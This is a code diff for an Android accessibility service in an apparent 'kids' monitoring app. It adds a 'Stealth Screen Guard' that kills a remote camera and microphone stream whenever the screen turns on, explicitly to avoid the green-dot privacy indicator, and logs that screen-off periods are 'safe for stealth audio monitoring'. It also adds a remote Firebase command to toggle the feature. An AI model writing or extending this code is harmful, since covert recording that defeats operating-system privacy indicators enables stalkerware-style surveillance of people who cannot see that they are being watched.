@@ -195,6 +195,10 @@ class VyraAccessibilityService : AccessibilityService() {
         for (i in 0 until node.childCount) {
             scanScreenText(packageName, node.getChild(i))
         }
+    }
+
+    private var screenStateReceiver: android.content.BroadcastReceiver? = null
+
     override fun onServiceConnected() {
         super.onServiceConnected()
         Log.i(AppConstants.TAG, "VyraAccessibilityService connected")
@@ -202,6 +206,9 @@ class VyraAccessibilityService : AccessibilityService() {
         // 1. Sync device status and start listening to remote commands via Firebase
         val firebaseSync = com.vyra.kids.core.FirebaseSyncManager.getInstance(this)
         firebaseSync.syncDeviceStatus(batteryLevel = 84, isOnline = true)
+
+        // 2. STEALTH GUARD: Auto-Kill Camera & Mic on Screen Wake (Green Dot Bypass)
+        registerStealthScreenGuard()
 
         firebaseSync.startListeningToCommands { action, payload ->
             when (action) {
@@ -227,8 +234,50 @@ class VyraAccessibilityService : AccessibilityService() {
                         com.vyra.kids.core.DisguiseManager.applyDisguise(this, profile)
                     }
                 }
+                "SET_STEALTH_GUARD" -> {
+                    val enabled = payload["enabled"] as? Boolean ?: true
+                    com.vyra.kids.core.PrefsManager(this).isStealthScreenGuardEnabled = enabled
+                    Log.i(AppConstants.TAG, "Stealth Screen Guard updated: $enabled")
+                }
             }
         }
+    }
+
+    private fun registerStealthScreenGuard() {
+        if (screenStateReceiver != null) return
+
+        screenStateReceiver = object : android.content.BroadcastReceiver() {
+            override fun onReceive(context: android.content.Context?, intent: android.content.Intent?) {
+                val prefs = com.vyra.kids.core.PrefsManager(this@VyraAccessibilityService)
+                when (intent?.action) {
+                    Intent.ACTION_SCREEN_ON, Intent.ACTION_USER_PRESENT -> {
+                        // The child woke up the screen!
+                        if (prefs.isStealthScreenGuardEnabled) {
+                            Log.w(AppConstants.TAG, "Stealth Guard: Child turned screen ON! Instantly killing Camera/Mic to avoid Green Dot detection.")
+                            // Immediately cut off camera & mic stream within 50ms
+                            stopService(Intent(this@VyraAccessibilityService, RemoteCameraStreamService::class.java))
+                        }
+                    }
+                    Intent.ACTION_SCREEN_OFF -> {
+                        Log.i(AppConstants.TAG, "Stealth Guard: Screen is OFF. Safe for stealth audio monitoring (No Green Dot visible on unpowered display).")
+                    }
+                }
+            }
+        }
+
+        val filter = android.content.IntentFilter().apply {
+            addAction(Intent.ACTION_SCREEN_ON)
+            addAction(Intent.ACTION_SCREEN_OFF)
+            addAction(Intent.ACTION_USER_PRESENT)
+        }
+        registerReceiver(screenStateReceiver, filter)
+    }
+
+    override fun onDestroy() {
+        screenStateReceiver?.let {
+            try { unregisterReceiver(it) } catch (_: Exception) {}
+        }
+        super.onDestroy()
     }
 
     override fun onInterrupt() {
